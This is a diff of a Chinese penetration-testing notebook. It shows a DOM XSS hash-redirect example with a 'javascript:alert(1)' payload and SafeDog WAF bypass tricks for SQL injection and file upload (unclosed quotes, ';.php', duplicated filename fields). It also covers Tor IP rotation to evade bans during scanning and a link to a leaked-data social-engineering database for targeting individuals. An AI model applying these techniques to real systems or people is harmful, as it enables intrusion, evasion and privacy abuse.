-ign()这些方法通过Javascript实现跳转。我们第一时间可能想到的是限制不严导致任意URL跳转漏洞，而DOM XSS与此似乎“八竿子打不着”，实际上跳转部分参数可控，可能导致Dom xss。
-
-首先我们来看个简单的例子:
-
-var hash = location.hash;
-if(hash){
-    var url = hash.substring(1);
-    location.href = url;
-}
-那么可以使用伪协议#javascript:alert(1)。
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520190651246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-
-
-
-
-
-
-强制下载文件
-重定向用户
-其他脚本以启用键盘记录器，拍照等
-网络钓鱼、窃取用户Cookies、弹广告刷流量、具备改页面信息、删除文章、获取客户端信息、传播蠕虫
 
 ### XSS防御
 
@@ -4102,37 +4210,7 @@ BurpSuite中的一个Tricks：不修改参数，直接重放数据包，对于�
 * 前面加86绕过
 * xff头伪造ip绕过
 
-# 在OWASP查看200多种漏洞
 
-## 供应链攻击
-
-2020年还是蓝海
-
-## 安全设备漏洞
-
-HW中多家安全设备报0day漏洞，一些安全设备出现问题相当于致命性问题，可能造成攻击队伍直接进入企业内网。同时，这也给安全厂商带来了技术的挑战性。在每年HW0day的考验下，安全产品的问题将会得到很大的改进
-
-Tomcat
-
-Nginx
-
-Apache
-
-Hadhoop
-
-Docker
-
-Jenkins
-
-Zenoss
-
-Jboss
-
-MongoDB
-
-Redis
-
-GlassFish
 
 ## DDOS 攻击
 
@@ -4203,8 +4281,12 @@ NTP DDOS 的原理
 
 ## 待补充： 日志审计
 
-# 通用技巧
-
+# 经验积累
+## 待补充:第三方软件漏洞
+### weblogic漏洞
+## 待重点完善：语言漏洞
+## 待重点完善：中间件
+## 待重点完善：CVE
 ## 待重点完善：WAF绕过
 ### WAF安装
 阿里云盾：初次安装就有阿里云盾默认开启，可以打开进程管理器后在看到阿里云盾进程。WAF收费版只是有自定义的不同，功能上都差不多。
@@ -4222,10 +4304,10 @@ NTP DDOS 的原理
 延迟访问
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708204428465.png)
 
-
+### SQL绕过
 ### 安全狗绕过
 #### 默认未开启的防御绕过
-##### SQL绕过
+
 主要利用安全狗是整段语句检测的，而SQL是逐步执行的
 **情况：目标网站允许接收其他请求方式；方法：post提交+敏感语句处理**
 当安全狗拒绝你直接用 `id=1 and 1=1 `直接插入在url的get请求中,你试着将其用在post请求中图是因为加了database所以被墙了。
@@ -4252,6 +4334,25 @@ NTP DDOS 的原理
 **情况：只允许接收get数据包；方法：**
 一般注入都是在get,安全狗对此就更多的使用防御。
 
+### 文件上传绕过
+#### 安全狗
+**数据溢出-防匹配(xxx...)**
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180150666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+**符号变异-防匹配`(' " ;)`**
+如图上传时修改数据包使其不闭合，可以绕过WAF。WAF在识别时一直想找闭合，但却找不着。但是php却会自动处理这类文件。对于安全狗，去掉后面的引号可以成功，但是去掉前面的引号却会导致绕过失败。这是因为安全狗的识别机制![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709201118607.png)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709202310936.png)
+或者你使用`;.php`分号使安全狗认为是语句结束了 
+**数据截断-防匹配(换行)**
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180250295.png)
+**重复数据-防匹配(参数多次)**
+写了多次，服务器是以最后一位为主
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180311818.png)
+安全狗误认为x.php没有对应的key,但是其实是写给了filename。上传后的文件是x.php
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070918032977.png)
+上传后的文件是jpeg;x.php
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180333728.png)
+斜杠也可以作为条件绕过
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180342299.png)
 
 
 ## 待补充：0day漏洞
@@ -4264,9 +4365,6 @@ NTP DDOS 的原理
 
 想到了个方法，就是扫描时使用tor代理，几分钟会自动换ip，前提是你需要一个国外或香港的代理，不然是连接不上TOR匿名网络的。
 
-## 暗网
-
-暗网下载链接，官方网址 https://www.torproject.org/zh-CN/download/   使用也很简单，我直接全点下一步安装，电脑挂上我的VPN，就可以轻松上网。
 
 
 
@@ -5004,7 +5102,6 @@ qq点找回密码，其他与前文已知邮箱操作相同
 
 #### 社工库
 
-暗网
 笔者这一节花了不少时间，因为资源太少。对于定向攻击或者人肉通过公开的社工库可能就是海底捞针了，但是反向思维通过泄露的数据去攻击某个人，那将会容易得多。
  http://site3.sjk.space/# 
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506174808635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -5565,15 +5662,9 @@ www.zusms.com
 https://jiemahao.com
 
 ### 匿名邮箱
-
-https://temp-mail.org/zh/
-
-https://www.linshiyouxiang.net/
-
-https://www.guerrillamail.com/zh/
-
 https://www.moakt.com/zh
-
+https://temp-mail.org/zh/
+https://www.guerrillamail.com/zh/
 http://links.icamtech.com/
 
 匿名后机会
@@ -5727,6 +5818,7 @@ Cobalt Strike 是迄今为止我最喜欢的红队模拟工具之一。什么是
 
 身为安全工程师，你应该寻找最新动向。如果你感兴趣以下自学网站，你应该写一个代码，去每天自动推送到你的微信。
 **待补充技能：爬虫+渗透**
+
 ## 自学
 
 
@@ -6405,6 +6497,7 @@ Books are a great way of deep diving into the theory, “The Web Application Hac
 不过老实说，写书的意义不在于赚钱。仅仅从赚钱的角度来说，出网课可能更划算一些。但是如果想给自己的职业生涯留点东西，写书意义大于出网课。
 
 ### 更多阅读
+在OWASP查看200多种漏洞
 
 很知名，必读《如何成为一名黑客》我这个链接就是作者更新的最新版 http://www.catb.org/esr/faqs/hacker-howto.html
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701185720116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -6456,6 +6549,6 @@ Metasploit渗透测试魔鬼训练营 :
 
 	http://pan.baidu.com/s/11iWPT 
 
-## 寻求交流社区
+## 待补充：寻求交流社区
 
 Twitter/Reddit/StackOverflow
